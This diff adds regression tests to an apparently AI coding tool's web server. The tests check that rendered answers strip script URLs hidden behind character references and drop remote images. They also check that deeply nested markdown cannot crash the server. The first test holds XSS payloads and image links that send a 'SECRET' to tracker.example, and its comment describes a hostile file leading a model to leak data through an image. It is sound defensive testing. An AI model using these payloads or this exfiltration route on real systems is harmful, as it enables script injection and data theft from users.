@@ -2167,3 +2167,155 @@ test('a tool call being written is drawn at its first fragment and grows in plac
     double.server.close()
   }
 })
+
+/**
+ * The URLs a page would follow in rendered markup, read as the browser reads them: numeric references and the
+ * ASCII-named ones a scheme can hide behind are decoded, tab and newline dropped, the ends trimmed.
+ */
+function followedUrls(html) {
+  const named = { Tab: '\t', NewLine: '\n', colon: ':', sol: '/', amp: '&', quot: '"', apos: "'", num: '#', quest: '?', period: '.', lt: '<', gt: '>', commat: '@' }
+  const decode = (value) =>
+    value.replace(/&(?:#(?:[xX]([0-9a-fA-F]+)|([0-9]+));?|([A-Za-z][A-Za-z0-9]*);)/g, (whole, hex, decimal, name) => {
+      if (name !== undefined) return named[name] ?? whole
+      const code = hex !== undefined ? Number.parseInt(hex, 16) : Number.parseInt(decimal, 10)
+      return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : '\ufffd'
+    })
+  return [...html.matchAll(/\s(href|src)="([^"]*)"/g)].map(([, attribute, value]) => ({
+    attribute,
+    url: decode(value).replace(/[\t\n\r]/g, '').replace(/^[\u0000-\u0020]+|[\u0000-\u0020]+$/g, ''),
+  }))
+}
+
+test('an answer carries neither a hidden script link nor a remote image, as the server renders it for the page', async (context) => {
+  if (!skipUnless(context, /web/.test((await runCli(['--help'])).stdout), CAPABILITY)) return
+  /**
+   * Live issues developer-two-6 and developer-two-7 (both P0, measured on 8082 and 3097 on 2026-10-29). The page sets
+   * an answer's server-rendered HTML with innerHTML. A raw-HTML link whose scheme hid behind character references
+   * (`&#x6A;avascript:`, `java&#x09;script:`, `javascript&colon;`, `&#x64;ata:`) passed both sanitisers and decoded in
+   * the browser into a script URL: one click ran script in heddle's origin. A remote image was fetched as soon as the
+   * answer was drawn, with no click, so a model led by a hostile file could send out what it had read.
+   */
+  const hidden = [
+    '&#x6A;avascript:alert(1)', '&#106;avascript:alert(1)', '&#0000106;avascript:alert(1)', 'java&#x09;script:alert(1)',
+    'java&Tab;script:alert(1)', 'javascript&colon;alert(1)', '&#x64;ata:text/html,x', '&#32;javascript:alert(1)', 'vb&#x73;cript:x',
+  ]
+  const remote = [
+    '![t](https://tracker.example/p.png?d=SECRET)', '<img src="https://tracker.example/p.png?d=SECRET">', '![t](//tracker.example/p.png)',
+    '<img src="&#x2F;&#x2F;tracker.example/p.png">', '<img src="http&#x3A;//tracker.example/p.png">',
+  ]
+  const answer = [
+    ...hidden.map((href, index) => `<a href="${href}">hidden ${index}</a>`),
+    ...remote,
+    '<a href="https://example.com/?a=1&amp;b=2">a real link</a>',
+    '![plot](/w/plot.png)',
+  ].join('\n\n')
+  const server = await startServer('answer-markup', [{ text: answer }])
+  try {
+    mkdirSync(server.work, { recursive: true })
+    const cookie = await cookieFor(server.url)
+    await api(server.url, cookie, '/api/workspaces', { method: 'POST', body: JSON.stringify({ path: server.work }) })
+    const opened = await api(server.url, cookie, '/api/folders/session', { method: 'POST', body: JSON.stringify({ folder: server.work }) })
+    const session = opened.body.session?.id ?? opened.body.id
+    const turn = await fetch(new URL('/api/turn', server.url), {
+      method: 'POST',
+      headers: { cookie, 'content-type': 'application/json' },
+      body: JSON.stringify({ prompt: 'answer with links', folder: server.work, session }),
+    })
+    assert.equal(turn.status, 200, `the turn ran (${turn.status})`)
+    await turn.text()
+    const detail = await api(server.url, cookie, `/api/sessions/${encodeURIComponent(session)}`)
+    const transcript = (detail.body.turns ?? []).filter((row) => row.kind === 'assistant').map((row) => row.html ?? '').join('\n')
+    assert.ok(transcript.includes('a real link'), `the transcript carries the answer's rendered HTML (${transcript.slice(0, 120)})`)
+    const rendered = await api(server.url, cookie, '/api/markdown', { method: 'POST', body: JSON.stringify({ text: answer }) })
+    assert.equal(rendered.status, 200, `the markdown route answers (${rendered.status})`)
+    for (const [where, html] of [['the transcript', transcript], ['POST /api/markdown', String(rendered.body.html ?? '')]]) {
+      const urls = followedUrls(html)
+      for (const { attribute, url } of urls) {
+        assert.doesNotMatch(url, /^(?:javascript|data|vbscript):/i, `${where}: no ${attribute} the browser decodes into a script or data URL (${url})`)
+        if (attribute === 'src') assert.doesNotMatch(url, /^(?:[a-z][a-z0-9+.-]*:)?\/\//i, `${where}: no image fetched from another host (${url})`)
+      }
+      assert.ok(urls.some(({ attribute, url }) => attribute === 'href' && url === 'https://example.com/?a=1&b=2'), `${where}: a real link is kept (${JSON.stringify(urls)})`)
+      assert.ok(urls.some(({ attribute, url }) => attribute === 'src' && url === '/api/raw?path=%2Fw%2Fplot.png'), `${where}: a local image is served by the file route (${JSON.stringify(urls)})`)
+    }
+  } finally {
+    await server.close()
+  }
+})
+
+test('a deeply nested answer, file or text renders, and the server keeps answering', async (context) => {
+  if (!skipUnless(context, /web/.test((await runCli(['--help'])).stdout), CAPABILITY)) return
+  /**
+   * Live issues developer-two-15 (P0) and -16 (2026-10-29): fifty thousand nested `>` overflowed the Rust renderer's
+   * stack and aborted the server, again on every open of the session whose answer held them; the TypeScript build
+   * failed the whole session view with marked's "Maximum call stack size exceeded". HTTP only.
+   */
+  const deep = `${'>'.repeat(50000)} x`
+  const server = await startServer('deep-nesting', () => [{ text: deep }])
+  try {
+    mkdirSync(server.work, { recursive: true })
+    writeFileSync(join(server.work, 'deep.md'), `${deep}\n`)
+    const cookie = await cookieFor(server.url)
+    await api(server.url, cookie, '/api/workspaces', { method: 'POST', body: JSON.stringify({ path: server.work }) })
+    const opened = await api(server.url, cookie, '/api/folders/session', { method: 'POST', body: JSON.stringify({ folder: server.work }) })
+    const session = opened.body.session?.id ?? opened.body.id
+    const turn = await fetch(new URL('/api/turn', server.url), {
+      method: 'POST',
+      headers: { cookie, 'content-type': 'application/json' },
+      body: JSON.stringify({ prompt: 'nest', folder: server.work, session }),
+    })
+    assert.equal(turn.status, 200, `the turn ran (${turn.status})`)
+    await turn.text()
+    for (const attempt of [1, 2]) {
+      const view = await api(server.url, cookie, `/api/sessions/${encodeURIComponent(session)}`).catch((error) => ({ status: `no answer: ${error.message}` }))
+      assert.equal(view.status, 200, `the session holding the deep answer opens (attempt ${attempt}: ${view.status})`)
+    }
+    const posted = await api(server.url, cookie, '/api/markdown', { method: 'POST', body: JSON.stringify({ text: deep }) }).catch((error) => ({ status: `no answer: ${error.message}`, body: {} }))
+    assert.equal(posted.status, 200, `the text renders (${posted.status})`)
+    assert.ok((String(posted.body.html ?? '').match(/<blockquote>/g) ?? []).length <= 100, 'at a bounded depth')
+    const file = await api(server.url, cookie, `/api/file?path=${encodeURIComponent(join(server.work, 'deep.md'))}`).catch((error) => ({ status: `no answer: ${error.message}` }))
+    assert.equal(file.status, 200, `the file previews (${file.status})`)
+    /**
+     * developer-three's review (2026-10-30): a line that only looks like a fence ("    ```", four spaces, is an indented
+     * code block) switched the first version's bound off for every later line, leaving Rust with the render stack as
+     * its only guard, through a workspace file and no model at all. And lists nest by indentation too: in this build an
+     * indented list of 1,500 levels ran out of heap.
+     */
+    const lookalike = `    \`\`\`\n\n${deep}`
+    writeFileSync(join(server.work, 'lookalike.md'), `${lookalike}\n`)
+    const lookalikePosted = await api(server.url, cookie, '/api/markdown', { method: 'POST', body: JSON.stringify({ text: lookalike }) }).catch((error) => ({ status: `no answer: ${error.message}`, body: {} }))
+    assert.equal(lookalikePosted.status, 200, `a text opened by a fence lookalike renders (${lookalikePosted.status})`)
+    assert.ok((String(lookalikePosted.body.html ?? '').match(/<blockquote>/g) ?? []).length <= 100, 'at a bounded depth too')
+    const lookalikeFile = await api(server.url, cookie, `/api/file?path=${encodeURIComponent(join(server.work, 'lookalike.md'))}`).catch((error) => ({ status: `no answer: ${error.message}` }))
+    assert.equal(lookalikeFile.status, 200, `and so does the file (${lookalikeFile.status})`)
+    const indented = Array.from({ length: 1200 }, (_, level) => `${'  '.repeat(level)}- ${level}`).join('\n')
+    const indentedPosted = await api(server.url, cookie, '/api/markdown', { method: 'POST', body: JSON.stringify({ text: indented }) }).catch((error) => ({ status: `no answer: ${error.message}`, body: {} }))
+    assert.equal(indentedPosted.status, 200, `an indented list of 1,200 levels renders (${indentedPosted.status})`)
+    const lists = (String(indentedPosted.body.html ?? '').match(/<ul>/g) ?? []).length
+    assert.ok(lists <= 101, `at a bounded depth (${lists} nested lists)`)
+    const alive = await fetch(new URL('/healthz', server.url)).then((response) => response.status).catch((error) => `no answer: ${error.message}`)
+    assert.equal(alive, 200, 'and the server is still up')
+  } finally {
+    await server.close()
+  }
+})
+
+
+test('over-budget inline markdown is escaped promptly and the server keeps answering', async (context) => {
+  if (!skipUnless(context, /web/.test((await runCli(['--help'])).stdout), CAPABILITY)) return
+  const server = await startServer('inline-budget')
+  try {
+    const cookie = await cookieFor(server.url)
+    for (const text of ['*a '.repeat(2000) + 'x' + ' a*'.repeat(2000), '*a '.repeat(800000) + 'x' + ' a*'.repeat(800000)]) {
+      const start = Date.now()
+      const response = await fetch(new URL('/api/markdown', server.url), {
+        method: 'POST', headers: { cookie, 'content-type': 'application/json' },
+        body: JSON.stringify({ text }), signal: AbortSignal.timeout(5000),
+      })
+      assert.equal(response.status, 200)
+      const rendered = await response.json()
+      assert.ok(String(rendered.html).startsWith('<pre class="unrendered"><code>'), 'over-budget text is not parsed')
+      assert.ok(Date.now() - start < 5000, 'rendering stays within the response budget')
+      assert.equal((await fetch(new URL('/healthz', server.url), { signal: AbortSignal.timeout(2000) })).status, 200)
+    }
+  } finally { await server.close() }
+})
